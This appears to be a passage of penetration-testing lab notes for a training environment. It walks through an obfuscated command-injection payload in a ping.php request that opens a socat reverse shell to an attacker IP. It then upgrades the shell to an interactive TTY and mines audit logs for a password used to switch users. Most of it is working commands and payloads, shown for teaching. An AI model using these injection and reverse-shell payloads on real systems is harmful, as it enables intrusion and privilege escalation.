## Getting a Reverse Shell

We can use [Socat](https://linux.die.net/man/1/socat) to establish a reverse shell connection.

```shell
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

```shell
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
Connection: close
```

Start a `Netcat` listener on the port used in the Socat command (8443 here) and execute the above request in Burp Repeater.

```shell
3kjS@htb[/htb]$ nc -nvlp 8443
```

Next, we'll need to upgrade to an `interactive TTY`. This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) describes a few methods.

```shell
3kjS@htb[/htb]$ socat file:`tty`,raw,echo=0 tcp-listen:4443
```

```shell
3kjS@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

```shell
webdev@dmz01:/var/www/html/monitoring$ id

uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
webdev@dmz01:/var/www/html/monitoring$
```

We can use [aureport](https://linux.die.net/man/8/aureport) to read audit logs on Linux systems, with the man page describing it as "aureport is a tool that produces summary reports of the audit system logs."

```shell
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less
```
![](Screenshot%202026-09-02%20at%2014.30.01.png)

```shell
webdev@dmz01:/var/www/html/monitoring$ su srvadm

Password: 
$ id

uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
$ /bin/bash -i

srvadm@dmz01:/var/www/html/monitoring$
```
